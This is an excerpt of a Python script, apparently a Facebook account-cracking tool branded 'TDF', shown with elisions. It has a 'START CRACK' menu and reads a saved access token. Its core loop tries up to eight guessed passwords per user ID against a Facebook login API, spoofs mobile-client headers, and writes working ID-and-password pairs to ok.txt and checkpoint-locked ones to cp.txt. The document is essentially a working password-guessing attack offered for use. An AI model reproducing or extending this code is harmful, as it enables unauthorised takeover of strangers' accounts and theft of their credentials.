...
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n████████ ██████  ███████ \n   ██    ██   ██ ██      \n   ██    ██   ██ █████   \n   ██    ██   ██ ██      \n   ██    ██████  ██      \n ▒▒▓▒ ░░    ▒▒▓  ▒  ▒ ░    \n  ▒▒▓ ░     ░ ▒  ▒  ░      \n     ░    ░ ░  ░  ░ ░    \n                 ▒▒▓░            \n            ░\n  \n    ╔═════════════════════════════╗\n    ║ MODIFIED BY:MR. RIGENIX     ║\n    ║ FACEBOOK:TAKE DOWN FIGHTERS ║\n    ║ YOUTUBE : MR. RIGENIX       ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	

def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m   Assalamualaikum From TDF\x1b[0m")
	print("")
	print("\033[95;1m  [1] START CRACK")
	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
	print("\033[96;1m  [3] JOIN OUR FACEBOOK GROUP  \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		main()
	elif sel =="3" or sel =="03" or sel =="F" or sel =="j":
		subprocess.check_output(["am", "start", "https://www.facebook.com/groups/take.down.fighters.officials"])
		main()
...
def token_check():
	try:
		token=open('tdf_token.txt','r').read()
	except IOError:
...
def menu():
    ...
    print("\033[93;1m     YOUR IP Brother : \033[92;1m") + ip
    print("")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[TDF-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[TDF-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[TDF-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _TDF, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[TDF-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[TDF-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[TDF-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[TDF-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[TDF-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[TDF-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[TDF-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[TDF-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[TDF-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[TDF-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[TDF-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			data = requests.get(api, params=params, headers=headers_)
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[TDF-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[TDF-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
